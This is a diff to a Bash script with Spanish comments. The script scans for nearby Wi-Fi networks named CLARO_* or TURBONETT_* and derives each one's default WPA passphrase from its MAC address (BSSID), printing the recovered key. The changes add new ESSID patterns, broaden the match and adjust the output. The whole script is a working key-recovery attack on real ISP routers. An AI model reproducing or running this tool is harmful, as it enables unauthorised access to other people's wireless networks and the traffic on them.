@@ -15,9 +15,10 @@ user=`whoami`
 	exit
  fi
 #regex que hace match con los ESSID afectados
-pat="^CLARO_[[:xdigit:]]{6}$"
-pat2="^IBW_WIM*[[:xdigit:]]$"
-pat3="^TURBONETT_[[:xdigit:]]{6}$"
+pat0="^CLARO_[[:xdigit:]]{6}$"
+pat1="^TURBONETT_[[:xdigit:]]{6}$"
+pat2="^TURBONETT_[[:xdigit:]]{3}$"
+pat3="^IBW_WIM*[[:xdigit:]]$"
 
 #obtenemos interfaz inalambrica y escaneamos
 iwconfig &> /tmp/wnics;
@@ -50,20 +51,20 @@ for i in `seq 1 $num`;
 	# leemos ESSID
 		read a2;
 		nom=$(echo $a2|cut -c8- |cut -d\" -f1);
-	# comparamos ESSID con patrón 
-		if [[ $nom =~ $pat ]]
+	# comparamos ESSID con cada patrón
+		if [[ $nom =~ $pat0 ]] || [[ $nom =~ $pat1 ]] || [[ $nom =~ $pat2 ]]
 		then
-	# si hace match quita el primer y ultimo hexadecimal
-	# del BSSID y agrega el ultimo despues de restarle uno ;) 
+	# si hace match quita el primer y ultimo par de hexadecimales
+	# del BSSID (MAC address) y se agrega el ultimo par despues de restarle uno ;)
 			clr=1
 			pre=$(echo $mac|cut -c4-|sed "s/://g"|rev|cut -c3-|rev)
 			suf=$(echo $mac|cut -c16-)
-			echo '+------------------------+';
+			echo '+----------------------------+';
 			echo "|" ESSID: $nom  "   |"
 			hex=$(($b16$suf-0x01));
 			hex=$(printf "%X\n" $hex);
-			echo "|" passphrase: $pre$hex "|"
-			echo '+------------------------+';
+			echo "|" passphrase: $pre$hex "    |"
+			echo '+----------------------------+';
 		fi
 		
 		sed -i -e "1d" /tmp/wlans
@@ -72,7 +73,7 @@ for i in `seq 1 $num`;
 
 if [[ $clr == "0" ]]
 then
-	echo "No se encontraron redes con patron CLARO_*"
+	echo "No se encontraron redes con patron CLARO_* o TURBONETT_*"
 fi
 
 rm /tmp/wnics /tmp/wlans
